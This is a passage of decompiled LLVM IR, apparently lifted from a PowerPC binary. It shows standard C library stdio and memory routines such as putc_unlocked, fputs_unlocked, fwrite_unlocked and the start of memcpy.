  %v5_1001b99c = call i32 @getc_unlocked(i16* %v1_1001b9d010, i32 %v3_1001b96c)
  %v6_1001b99c = trunc i32 %v5_1001b99c to i8
  %v4_1001b9a0 = icmp eq i8 %v6_1001b99c, -1
  store i1 %v4_1001b9a0, i1* %cr7_eq.global-to-local, align 1
  %v3_1001b9a8 = icmp eq i8 %v6_1001b99c, 10
  store i1 %v3_1001b9a8, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1001b9a0, label %dec_label_pc_1001b9b0, label %dec_label_pc_1001b9c0

dec_label_pc_1001b9b0:                            ; preds = %dec_label_pc_1001b99c
  %v0_1001b9b0 = load i32, i32* @r30, align 4
  %v1_1001b9b0 = inttoptr i32 %v0_1001b9b0 to i16*
  %v2_1001b9b0 = load i16, i16* %v1_1001b9b0, align 2
  %v1_1001b9b4 = and i16 %v2_1001b9b0, 8
  %v3_1001b9b4 = icmp eq i16 %v1_1001b9b4, 0
  br i1 %v3_1001b9b4, label %dec_label_pc_1001b9b0.dec_label_pc_1001b9d8_crit_edge, label %dec_label_pc_1001b9ec

dec_label_pc_1001b9b0.dec_label_pc_1001b9d8_crit_edge: ; preds = %dec_label_pc_1001b9b0
  %v0_1001b9d8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001b9d8

dec_label_pc_1001b9c0:                            ; preds = %dec_label_pc_1001b99c
  %v3_1001b9c0 = load i32, i32* @r31, align 4
  %v4_1001b9c0 = inttoptr i32 %v3_1001b9c0 to i8*
  store i8 %v6_1001b99c, i8* %v4_1001b9c0, align 1
  %v0_1001b9c4 = load i32, i32* @r31, align 4
  %v1_1001b9c4 = add i32 %v0_1001b9c4, 1
  store i32 %v1_1001b9c4, i32* @r31, align 4
  %v0_1001b9c8 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1001b9c8, label %dec_label_pc_1001b9d8, label %dec_label_pc_1001b9cc.backedge

dec_label_pc_1001b9cc.backedge:                   ; preds = %dec_label_pc_1001b9c0, %dec_label_pc_1001b980
  %v2_1001b98812 = phi i32 [ %v1_1001b9c4, %dec_label_pc_1001b9c0 ], [ %v1_1001b990, %dec_label_pc_1001b980 ]
  %v0_1001b9cc = load i32, i32* @r29, align 4
  %v2_1001b9cc = add i32 %v0_1001b9cc, -1
  store i32 %v2_1001b9cc, i32* @r29, align 4
  %v0_1001b9d0 = load i32, i32* @r30, align 4
  %v4_1001b9d4 = icmp eq i32 %v0_1001b9cc, 1
  br i1 %v4_1001b9d4, label %dec_label_pc_1001b9d8, label %dec_label_pc_1001b96c

dec_label_pc_1001b9d8:                            ; preds = %dec_label_pc_1001b9c0, %dec_label_pc_1001b9cc.backedge, %dec_label_pc_1001b980, %dec_label_pc_1001b964, %dec_label_pc_1001b9b0.dec_label_pc_1001b9d8_crit_edge
  %v2_1001b9e4 = phi i32 [ %v0_1001b9d8.pre, %dec_label_pc_1001b9b0.dec_label_pc_1001b9d8_crit_edge ], [ %tmp, %dec_label_pc_1001b964 ], [ %v1_1001b990, %dec_label_pc_1001b980 ], [ %v2_1001b98812, %dec_label_pc_1001b9cc.backedge ], [ %v1_1001b9c4, %dec_label_pc_1001b9c0 ]
  %v1_1001b9d8 = load i32, i32* @r28, align 4
  %v3_1001b9d8 = icmp ugt i32 %v2_1001b9e4, %v1_1001b9d8
  %v4_1001b9d8 = icmp eq i32 %v2_1001b9e4, %v1_1001b9d8
  store i1 %v4_1001b9d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001b9d8, label %dec_label_pc_1001b9e0, label %dec_label_pc_1001b9ec

dec_label_pc_1001b9e0:                            ; preds = %dec_label_pc_1001b9d8
  %v3_1001b9e4 = inttoptr i32 %v2_1001b9e4 to i8*
  store i8 0, i8* %v3_1001b9e4, align 1
  %v0_1001b9f4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001b9f0

dec_label_pc_1001b9ec:                            ; preds = %dec_label_pc_1001b9b0, %dec_label_pc_1001b9d8, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1001b9f0

dec_label_pc_1001b9f0:                            ; preds = %dec_label_pc_1001b9e0, %dec_label_pc_1001b9ec
  %v0_1001b9f4 = phi i32 [ %v0_1001b9f4.pre, %dec_label_pc_1001b9e0 ], [ 0, %dec_label_pc_1001b9ec ]
  ret i32 %v0_1001b9f4

; uselistorder directives
  uselistorder i32 %v2_1001b9e4, { 0, 2, 1 }
  uselistorder i8 %v6_1001b99c, { 1, 0, 2 }
  uselistorder i32 %v3_1001b970, { 1, 0 }
  uselistorder i32 %v3_1001b96c, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_1001b96c, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001b9f0, { 1, 0 }
  uselistorder label %dec_label_pc_1001b9ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001b9d8, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1001b96c, { 1, 0 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* @r30, align 4
  %v2_1001ba20 = add i32 %arg2, 16
  %v3_1001ba20 = inttoptr i32 %v2_1001ba20 to i32*
  %v4_1001ba20 = load i32, i32* %v3_1001ba20, align 4
  store i32 %v4_1001ba20, i32* %r11.global-to-local, align 4
  %v2_1001ba24 = add i32 %arg2, 28
  %v3_1001ba24 = inttoptr i32 %v2_1001ba24 to i32*
  %v4_1001ba24 = load i32, i32* %v3_1001ba24, align 4
  %v2_1001ba28 = icmp ult i32 %v4_1001ba20, %v4_1001ba24
  br i1 %v2_1001ba28, label %dec_label_pc_1001ba30, label %dec_label_pc_1001ba44

dec_label_pc_1001ba30:                            ; preds = %entry
  %v1_1001ba301 = zext i8 %arg1 to i32
  %v1_1001ba34 = add i32 %v4_1001ba20, 1
  store i32 %v1_1001ba34, i32* %r9.global-to-local, align 4
  store i32 %v1_1001ba301, i32* %r3.global-to-local, align 4
  %v3_1001ba3c = inttoptr i32 %v4_1001ba20 to i8*
  store i8 %arg1, i8* %v3_1001ba3c, align 1
  %v0_1001bae8.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1001bae8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001bae8

dec_label_pc_1001ba44:                            ; preds = %entry
  %tmp11 = inttoptr i32 %arg2 to i16*
  %v3_1001ba44 = load i16, i16* %tmp11, align 2
  %v4_1001ba44 = zext i16 %v3_1001ba44 to i32
  %v1_1001ba48 = call i32 @__asm_rlwinm(i32 %v4_1001ba44, i32 0, i32 24, i32 25)
  %v3_1001ba4c = icmp eq i32 %v1_1001ba48, 192
  br i1 %v3_1001ba4c, label %dec_label_pc_1001ba68, label %dec_label_pc_1001ba54

dec_label_pc_1001ba54:                            ; preds = %dec_label_pc_1001ba44
  store i32 %arg2, i32* @r3, align 4
  store i32 128, i32* @r4, align 4
  store i32 268548704, i32* @lr, align 4
  %v0_1001ba5c = call i32 @__stdio_trans2w_o()
  store i32 %v0_1001ba5c, i32* %r3.global-to-local, align 4
  %v3_1001ba60 = icmp eq i32 %v0_1001ba5c, 0
  br i1 %v3_1001ba60, label %dec_label_pc_1001ba68, label %dec_label_pc_1001bb14

dec_label_pc_1001ba68:                            ; preds = %dec_label_pc_1001ba54, %dec_label_pc_1001ba44
  %v0_1001ba68 = load i32, i32* @r31, align 4
  %v1_1001ba68 = add i32 %v0_1001ba68, 4
  %v2_1001ba68 = inttoptr i32 %v1_1001ba68 to i32*
  %v3_1001ba68 = load i32, i32* %v2_1001ba68, align 4
  %v0_1001ba6c = load i32, i32* @r30, align 4
  %v1_1001ba6c = urem i32 %v0_1001ba6c, 256
  store i32 %v1_1001ba6c, i32* %r3.global-to-local, align 4
  %v3_1001ba70 = icmp eq i32 %v3_1001ba68, -2
  br i1 %v3_1001ba70, label %dec_label_pc_1001bb18, label %dec_label_pc_1001ba78

dec_label_pc_1001ba78:                            ; preds = %dec_label_pc_1001ba68
  %v1_1001ba78 = add i32 %v0_1001ba68, 12
  %v2_1001ba78 = inttoptr i32 %v1_1001ba78 to i32*
  %v3_1001ba78 = load i32, i32* %v2_1001ba78, align 4
  store i32 %v3_1001ba78, i32* %r9.global-to-local, align 4
  %v1_1001ba7c = add i32 %v0_1001ba68, 8
  %v2_1001ba7c = inttoptr i32 %v1_1001ba7c to i32*
  %v3_1001ba7c = load i32, i32* %v2_1001ba7c, align 4
  %v4_1001ba80 = icmp eq i32 %v3_1001ba78, %v3_1001ba7c
  br i1 %v4_1001ba80, label %dec_label_pc_1001baf0, label %dec_label_pc_1001ba88

dec_label_pc_1001ba88:                            ; preds = %dec_label_pc_1001ba78
  %v1_1001ba88 = add i32 %v0_1001ba68, 16
  %v2_1001ba88 = inttoptr i32 %v1_1001ba88 to i32*
  %v3_1001ba88 = load i32, i32* %v2_1001ba88, align 4
  %v4_1001ba8c = icmp eq i32 %v3_1001ba78, %v3_1001ba88
  br i1 %v4_1001ba8c, label %dec_label_pc_1001ba94, label %dec_label_pc_1001baa4

dec_label_pc_1001ba94:                            ; preds = %dec_label_pc_1001ba88
  store i32 %v0_1001ba68, i32* @r3, align 4
  store i32 268548764, i32* @lr, align 4
  %v0_1001ba98 = call i32 @__stdio_wcommit()
  store i32 %v0_1001ba98, i32* %r3.global-to-local, align 4
  %v3_1001ba9c = icmp eq i32 %v0_1001ba98, 0
  br i1 %v3_1001ba9c, label %dec_label_pc_1001ba94.dec_label_pc_1001baa4_crit_edge, label %dec_label_pc_1001bb14

dec_label_pc_1001ba94.dec_label_pc_1001baa4_crit_edge: ; preds = %dec_label_pc_1001ba94
  %v0_1001baa4.pre = load i32, i32* @r31, align 4
  %v0_1001baa8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001baa4

dec_label_pc_1001baa4:                            ; preds = %dec_label_pc_1001ba94.dec_label_pc_1001baa4_crit_edge, %dec_label_pc_1001ba88
  %v0_1001baa8 = phi i32 [ %v0_1001baa8.pre, %dec_label_pc_1001ba94.dec_label_pc_1001baa4_crit_edge ], [ %v0_1001ba6c, %dec_label_pc_1001ba88 ]
  %v0_1001baa4 = phi i32 [ %v0_1001baa4.pre, %dec_label_pc_1001ba94.dec_label_pc_1001baa4_crit_edge ], [ %v0_1001ba68, %dec_label_pc_1001ba88 ]
  %v1_1001baa4 = add i32 %v0_1001baa4, 16
  %v2_1001baa4 = inttoptr i32 %v1_1001baa4 to i32*
  %v3_1001baa4 = load i32, i32* %v2_1001baa4, align 4
  store i32 %v3_1001baa4, i32* %r9.global-to-local, align 4
  %v1_1001baa8 = urem i32 %v0_1001baa8, 256
  store i32 %v1_1001baa8, i32* %r11.global-to-local, align 4
  %v1_1001baac = trunc i32 %v0_1001baa8 to i8
  %v3_1001baac = inttoptr i32 %v3_1001baa4 to i8*
  store i8 %v1_1001baac, i8* %v3_1001baac, align 1
  %v0_1001bab0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001bab0 = add i32 %v0_1001bab0, 1
  store i32 %v1_1001bab0, i32* %r9.global-to-local, align 4
  %v1_1001bab4 = load i32, i32* @r31, align 4
  %v2_1001bab4 = add i32 %v1_1001bab4, 16
  %v3_1001bab4 = inttoptr i32 %v2_1001bab4 to i32*
  store i32 %v1_1001bab0, i32* %v3_1001bab4, align 4
  %v0_1001bab8 = load i32, i32* @r31, align 4
  %v1_1001bab8 = inttoptr i32 %v0_1001bab8 to i16*
  %v2_1001bab8 = load i16, i16* %v1_1001bab8, align 2
  %v3_1001bab8 = zext i16 %v2_1001bab8 to i32
  %v1_1001babc = and i32 %v3_1001bab8, 256
  store i32 %v1_1001babc, i32* %r9.global-to-local, align 4
  %v3_1001babc = icmp eq i32 %v1_1001babc, 0
  br i1 %v3_1001babc, label %dec_label_pc_1001bb0c, label %dec_label_pc_1001bac4

dec_label_pc_1001bac4:                            ; preds = %dec_label_pc_1001baa4
  %v0_1001bac4 = load i32, i32* %r11.global-to-local, align 4
  %v3_1001bac4 = icmp eq i32 %v0_1001bac4, 10
  br i1 %v3_1001bac4, label %dec_label_pc_1001bacc, label %dec_label_pc_1001bb0c

dec_label_pc_1001bacc:                            ; preds = %dec_label_pc_1001bac4
  store i32 %v0_1001bab8, i32* @r3, align 4
  store i32 268548820, i32* @lr, align 4
  %v0_1001bad0 = call i32 @__stdio_wcommit()
  store i32 %v0_1001bad0, i32* %r3.global-to-local, align 4
  %v3_1001bad4 = icmp eq i32 %v0_1001bad0, 0
  br i1 %v3_1001bad4, label %dec_label_pc_1001bb0c, label %dec_label_pc_1001badc

dec_label_pc_1001badc:                            ; preds = %dec_label_pc_1001bacc
  %v0_1001badc = load i32, i32* @r31, align 4
  %v1_1001badc = add i32 %v0_1001badc, 16
  %v2_1001badc = inttoptr i32 %v1_1001badc to i32*
  %v3_1001badc = load i32, i32* %v2_1001badc, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1001bae4 = add i32 %v3_1001badc, -1
  store i32 %v1_1001bae4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001bae8

dec_label_pc_1001bae8:                            ; preds = %dec_label_pc_1001ba30, %dec_label_pc_1001badc
  %v1_1001bae8 = phi i32 [ %v1_1001bae8.pre, %dec_label_pc_1001ba30 ], [ %v0_1001badc, %dec_label_pc_1001badc ]
  %v0_1001bae8 = phi i32 [ %v0_1001bae8.pre, %dec_label_pc_1001ba30 ], [ %v1_1001bae4, %dec_label_pc_1001badc ]
  %v2_1001bae8 = add i32 %v1_1001bae8, 16
  %v3_1001bae8 = inttoptr i32 %v2_1001bae8 to i32*
  store i32 %v0_1001bae8, i32* %v3_1001bae8, align 4
  %v0_1001bb28.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001bb18

dec_label_pc_1001baf0:                            ; preds = %dec_label_pc_1001ba78
  %v1_1001baf0 = inttoptr i32 %v0_1001ba68 to i16*
  store i32 %v0_1001ba68, i32* %r3.global-to-local, align 4
  %v2_1001baf4 = ptrtoint i8* %stack_var_-24 to i32
  store i32 1, i32* @r5, align 4
  %v6_1001bafc = trunc i32 %v0_1001ba6c to i8
  store i8 %v6_1001bafc, i8* %stack_var_-24, align 1
  store i32 268548868, i32* @lr, align 4
  %v5_1001bb00 = call i32 @__stdio_WRITE(i16* %v1_1001baf0, i32 %v2_1001baf4)
  store i32 %v5_1001bb00, i32* %r3.global-to-local, align 4
  %v3_1001bb04 = icmp eq i32 %v5_1001bb00, 0
  br i1 %v3_1001bb04, label %dec_label_pc_1001bb14, label %dec_label_pc_1001bb0c

dec_label_pc_1001bb0c:                            ; preds = %dec_label_pc_1001bac4, %dec_label_pc_1001baf0, %dec_label_pc_1001bacc, %dec_label_pc_1001baa4
  %v0_1001bb0c = load i32, i32* @r30, align 4
  %v1_1001bb0c = urem i32 %v0_1001bb0c, 256
  store i32 %v1_1001bb0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001bb18

dec_label_pc_1001bb14:                            ; preds = %dec_label_pc_1001ba94, %dec_label_pc_1001ba54, %dec_label_pc_1001baf0
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001bb18

dec_label_pc_1001bb18:                            ; preds = %dec_label_pc_1001ba68, %dec_label_pc_1001bb0c, %dec_label_pc_1001bae8, %dec_label_pc_1001bb14
  %v0_1001bb28 = phi i32 [ %v1_1001ba6c, %dec_label_pc_1001ba68 ], [ %v1_1001bb0c, %dec_label_pc_1001bb0c ], [ %v0_1001bb28.pre, %dec_label_pc_1001bae8 ], [ -1, %dec_label_pc_1001bb14 ]
  ret i32 %v0_1001bb28

; uselistorder directives
  uselistorder i32 %v1_1001bb0c, { 1, 0 }
  uselistorder i32 %v0_1001baa8, { 1, 0 }
  uselistorder i32 %v1_1001ba6c, { 1, 0 }
  uselistorder i32 %v0_1001ba6c, { 1, 2, 0 }
  uselistorder i32 %v0_1001ba68, { 2, 3, 0, 1, 4, 6, 5, 7 }
  uselistorder i32 %v4_1001ba20, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 10, 7, 2, 8, 9, 1, 11, 0 }
  uselistorder i32 %arg2, { 0, 4, 1, 2, 3 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001bb18, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1001bb14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001bb0c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1001bae8, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1001bb44 = call i32 @__GI_strlen()
  store i32 %v0_1001bb44, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1001bb60.1181 to i32), i32* @lr, align 4
  %v4_1001bb5c = inttoptr i32 %arg2 to i16*
  %v5_1001bb5c = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_1001bb44, i16* %v4_1001bb5c)
  %v1_1001bb64 = load i32, i32* @r27, align 4
  %v4_1001bb64 = icmp eq i32 %v5_1001bb5c, %v1_1001bb64
  br i1 %v4_1001bb64, label %dec_label_pc_1001bb6c, label %dec_label_pc_1001bb70

dec_label_pc_1001bb6c:                            ; preds = %entry
  br label %dec_label_pc_1001bb70

dec_label_pc_1001bb70:                            ; preds = %entry, %dec_label_pc_1001bb6c
  %v0_1001bb70 = phi i32 [ -1, %entry ], [ %v5_1001bb5c, %dec_label_pc_1001bb6c ]
  ret i32 %v0_1001bb70

; uselistorder directives
  uselistorder label %dec_label_pc_1001bb70, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v3_1001bb94 = load i16, i16* %arg4, align 2
  %v4_1001bb94 = zext i16 %v3_1001bb94 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1001bba8 = call i32 @__asm_rlwinm(i32 %v4_1001bb94, i32 0, i32 24, i32 25)
  store i32 128, i32* @r4, align 4
  %v3_1001bbb0 = icmp eq i32 %v1_1001bba8, 192
  store i32 %arg3, i32* @r31, align 4
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1001bbb0, label %dec_label_pc_1001bbcc, label %dec_label_pc_1001bbc0

dec_label_pc_1001bbc0:                            ; preds = %entry
  store i32 268549060, i32* @lr, align 4
  %v0_1001bbc0 = call i32 @__stdio_trans2w_o()
  %v3_1001bbc4 = icmp eq i32 %v0_1001bbc0, 0
  br i1 %v3_1001bbc4, label %dec_label_pc_1001bbc0.dec_label_pc_1001bbcc_crit_edge, label %dec_label_pc_1001bc24

dec_label_pc_1001bbc0.dec_label_pc_1001bbcc_crit_edge: ; preds = %dec_label_pc_1001bbc0
  %v0_1001bbd0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001bbcc

dec_label_pc_1001bbcc:                            ; preds = %dec_label_pc_1001bbc0.dec_label_pc_1001bbcc_crit_edge, %entry
  %v0_1001bbf0 = phi i32 [ %v0_1001bbd0.pre, %dec_label_pc_1001bbc0.dec_label_pc_1001bbcc_crit_edge ], [ %arg3, %entry ]
  %v0_1001bbcc = load i32, i32* @r29, align 4
  %v3_1001bbcc = icmp eq i32 %v0_1001bbcc, 0
  %v3_1001bbd0 = icmp eq i32 %v0_1001bbf0, 0
  %brmerge = or i1 %v3_1001bbd0, %v3_1001bbcc
  br i1 %brmerge, label %dec_label_pc_1001bc24, label %dec_label_pc_1001bbdc

dec_label_pc_1001bbdc:                            ; preds = %dec_label_pc_1001bbcc
  %v2_1001bbe0 = mul i32 %v0_1001bbcc, %v0_1001bbf0
  store i32 %v2_1001bbe0, i32* %r4.global-to-local, align 4
  %v2_1001bbe4 = udiv i32 -1, %v0_1001bbcc
  %v0_1001bbec = load i32, i32* @r30, align 4
  %v3_1001bbf0 = icmp ugt i32 %v0_1001bbf0, %v2_1001bbe4
  %v1_1001bc04 = inttoptr i32 %v0_1001bbec to i16*
  br i1 %v3_1001bbf0, label %dec_label_pc_1001bc04, label %dec_label_pc_1001bbf8

dec_label_pc_1001bbf8:                            ; preds = %dec_label_pc_1001bbdc
  %v0_1001bbe8 = load i32, i32* @r28, align 4
  store i32 268549116, i32* @lr, align 4
  %v5_1001bbf8 = call i32 @__stdio_fwrite(i32 %v0_1001bbe8, i32 %v2_1001bbe0, i16* %v1_1001bc04)
  %v1_1001bbfc = load i32, i32* @r29, align 4
  %v2_1001bbfc = udiv i32 %v5_1001bbf8, %v1_1001bbfc
  store i32 %v2_1001bbfc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001bc28

dec_label_pc_1001bc04:                            ; preds = %dec_label_pc_1001bbdc
  %v2_1001bc04 = load i16, i16* %v1_1001bc04, align 2
  %v1_1001bc08 = or i16 %v2_1001bc04, 8
  store i16 %v1_1001bc08, i16* %v1_1001bc04, align 2
  %v0_1001bc10 = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1001bc1c = inttoptr i32 %v0_1001bc10 to i32*
  store i32 22, i32* %v2_1001bc1c, align 4
  %v0_1001bc2c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001bc28

dec_label_pc_1001bc24:                            ; preds = %dec_label_pc_1001bbcc, %dec_label_pc_1001bbc0
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001bc28

dec_label_pc_1001bc28:                            ; preds = %dec_label_pc_1001bc04, %dec_label_pc_1001bbf8, %dec_label_pc_1001bc24
  %v0_1001bc2c = phi i32 [ %v0_1001bc2c.pre, %dec_label_pc_1001bc04 ], [ %v2_1001bbfc, %dec_label_pc_1001bbf8 ], [ 0, %dec_label_pc_1001bc24 ]
  ret i32 %v0_1001bc2c

; uselistorder directives
  uselistorder i16* %v1_1001bc04, { 1, 2, 0 }
  uselistorder i32 %v0_1001bbcc, { 1, 0, 2 }
  uselistorder i32 %v0_1001bbf0, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder i32 ()* @__stdio_trans2w_o, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001bc28, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1001bc40 = load i32, i32* @r4, align 4
  %v1_1001bc40 = add i32 %v0_1001bc40, -4
  store i32 %v1_1001bc40, i32* %r4.global-to-local, align 4
  %v0_1001bc44 = load i32, i32* @r3, align 4
  %v1_1001bc44 = add i32 %v0_1001bc44, -4
  store i32 %v1_1001bc44, i32* @r11, align 4
  %v0_1001bc48 = load i32, i32* @r5, align 4
  %v1_1001bc48 = call i32 @__asm_rlwinm.(i32 %v0_1001bc48, i32 29, i32 3, i32 31)
  store i32 %v1_1001bc48, i32* %r9.global-to-local, align 4
  %v4_1001bc48 = icmp eq i32 %v1_1001bc48, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1001bc48, label %dec_label_pc_1001bc70, label %dec_label_pc_1001bc50

dec_label_pc_1001bc50:                            ; preds = %entry
  %v0_1001bc50 = load i32, i32* @r11, align 4
  %v1_1001bc50 = urem i32 %v0_1001bc50, 4
  %v3_1001bc50 = icmp eq i32 %v1_1001bc50, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1001bc50, label %dec_label_pc_1001bc58, label %dec_label_pc_1001bcac

dec_label_pc_1001bc58:                            ; preds = %dec_label_pc_1001bccc.dec_label_pc_1001bc58_crit_edge, %dec_label_pc_1001bc50
  %v1_1001bc64.pre = phi i32 [ %v0_1001bc50, %dec_label_pc_1001bc50 ], [ %v1_1001bc64.pre.pre, %dec_label_pc_1001bccc.dec_label_pc_1001bc58_crit_edge ]
  %v0_1001bc58 = phi i32 [ %v1_1001bc48, %dec_label_pc_1001bc50 ], [ %v1_1001bccc, %dec_label_pc_1001bccc.dec_label_pc_1001bc58_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1001bc50 ], [ %v2_1001bcb4, %dec_label_pc_1001bccc.dec_label_pc_1001bc58_crit_edge ]
  store i32 %v0_1001bc58, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001bc5c

dec_label_pc_1001bc5c:                            ; preds = %dec_label_pc_1001bc5c, %dec_label_pc_1001bc58
  %v1_1001bc64 = phi i32 [ %v2_1001bc68, %dec_label_pc_1001bc5c ], [ %v1_1001bc64.pre, %dec_label_pc_1001bc58 ]
  %v0_1001bc5c = load i32, i32* %r4.global-to-local, align 4
  %v1_1001bc5c = add i32 %v0_1001bc5c, 4
  %v2_1001bc5c = inttoptr i32 %v1_1001bc5c to i32*
  %v3_1001bc5c = load i32, i32* %v2_1001bc5c, align 4
  %v1_1001bc60 = add i32 %v0_1001bc5c, 8
  %v2_1001bc60 = inttoptr i32 %v1_1001bc60 to i32*
  %v3_1001bc60 = load i32, i32* %v2_1001bc60, align 4
  store i32 %v3_1001bc60, i32* %r9.global-to-local, align 4
  store i32 %v1_1001bc60, i32* %r4.global-to-local, align 4
  %v2_1001bc64 = add i32 %v1_1001bc64, 4
  %v3_1001bc64 = inttoptr i32 %v2_1001bc64 to i32*
  store i32 %v3_1001bc5c, i32* %v3_1001bc64, align 4
  %v0_1001bc68 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001bc68 = load i32, i32* @r11, align 4
  %v2_1001bc68 = add i32 %v1_1001bc68, 8
  %v3_1001bc68 = inttoptr i32 %v2_1001bc68 to i32*
  store i32 %v0_1001bc68, i32* %v3_1001bc68, align 4
  store i32 %v2_1001bc68, i32* @r11, align 4
  %v0_1001bc6c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bc6c = add i32 %v0_1001bc6c, -1
  store i32 %v1_1001bc6c, i32* %ctr.global-to-local, align 4
  %v2_1001bc6c = icmp eq i32 %v1_1001bc6c, 0
  br i1 %v2_1001bc6c, label %dec_label_pc_1001bc70, label %dec_label_pc_1001bc5c

dec_label_pc_1001bc70:                            ; preds = %dec_label_pc_1001bc5c, %dec_label_pc_1001bccc, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1001bcb4, %dec_label_pc_1001bccc ], [ %.0, %dec_label_pc_1001bc5c ]
  %v1_1001bc70 = urem i32 %.1, 8
  store i32 %v1_1001bc70, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1001bc70, 4
  br i1 %tmp, label %dec_label_pc_1001bc88, label %dec_label_pc_1001bc7c

dec_label_pc_1001bc7c:                            ; preds = %dec_label_pc_1001bc70
  %v0_1001bc7c = load i32, i32* %r4.global-to-local, align 4
  %v1_1001bc7c = add i32 %v0_1001bc7c, 4
  %v2_1001bc7c = inttoptr i32 %v1_1001bc7c to i32*
  %v3_1001bc7c = load i32, i32* %v2_1001bc7c, align 4
  store i32 %v1_1001bc7c, i32* %r4.global-to-local, align 4
  %v1_1001bc80 = add nsw i32 %v1_1001bc70, -4
  store i32 %v1_1001bc80, i32* @r5, align 4
  %v1_1001bc84 = load i32, i32* @r11, align 4
  %v2_1001bc84 = add i32 %v1_1001bc84, 4
  %v3_1001bc84 = inttoptr i32 %v2_1001bc84 to i32*
  store i32 %v3_1001bc7c, i32* %v3_1001bc84, align 4
  store i32 %v2_1001bc84, i32* @r11, align 4
  %v0_1001bc88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1001bc88

dec_label_pc_1001bc88:                            ; preds = %dec_label_pc_1001bc70, %dec_label_pc_1001bc7c
  %v0_1001bc88 = phi i32 [ %v1_1001bc70, %dec_label_pc_1001bc70 ], [ %v0_1001bc88.pre, %dec_label_pc_1001bc7c ]
  %v3_1001bc88 = icmp eq i32 %v0_1001bc88, 0
  %v0_1001bc8c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001bc88, i32 %v0_1001bc8c)
  %v0_1001bc90 = load i32, i32* @r5, align 4
  store i32 %v0_1001bc90, i32* %ctr.global-to-local, align 4
  %v0_1001bc94 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001bc94 = add i32 %v0_1001bc94, 3
  store i32 %v1_1001bc94, i32* %r4.global-to-local, align 4
  %v0_1001bc98 = load i32, i32* @r11, align 4
  %v1_1001bc98 = add i32 %v0_1001bc98, 3
  store i32 %v1_1001bc98, i32* %r9.global-to-local, align 4
  %v1_1001bc9c8 = add i32 %v0_1001bc94, 4
  %v2_1001bc9c9 = inttoptr i32 %v1_1001bc9c8 to i8*
  %v3_1001bc9c10 = load i8, i8* %v2_1001bc9c9, align 1
  store i32 %v1_1001bc9c8, i32* %r4.global-to-local, align 4
  %v3_1001bca012 = add i32 %v0_1001bc98, 4
  %v4_1001bca013 = inttoptr i32 %v3_1001bca012 to i8*
